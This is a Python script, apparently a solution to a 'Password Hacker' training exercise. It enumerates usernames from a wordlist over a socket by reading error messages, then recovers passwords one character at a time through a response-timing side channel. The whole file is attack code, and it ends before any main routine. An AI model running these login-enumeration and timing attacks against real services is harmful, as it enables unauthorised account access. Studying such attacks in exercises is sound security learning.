import itertools
import json
from datetime import datetime
from string import ascii_letters, digits
import sys
import socket


def socket_send(socket, login, password):
    data = json.dumps({'login': login, 'password': password}).encode()
    socket.send(data)
    response = json.loads(socket.recv(1024).decode())
    return response['result']


def hack_login(socket):
    with open("C:\\Users\\Dell\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt",
              'r') as file:
        for login in file:
            login = login.rstrip()
            response = socket_send(socket, login, password=" ")
            if response == "Wrong password!":
                return login


def hack_password(login, socket):
    chars = itertools.cycle(digits + ascii_letters)
    known_chars = ""
    with open("logs.txt", "w") as file:
        for char in chars:
            password = known_chars + char
            start = datetime.now()
            response = socket_send(socket, login, password)
            finish = datetime.now()
            delta = (finish - start).microseconds

            if delta > 90000:
                file.write(str(delta) + '\n')

            if response == "Wrong password!" and delta >90000:
                known_chars = password
                continue
            elif response == "Connection success!":
                return password
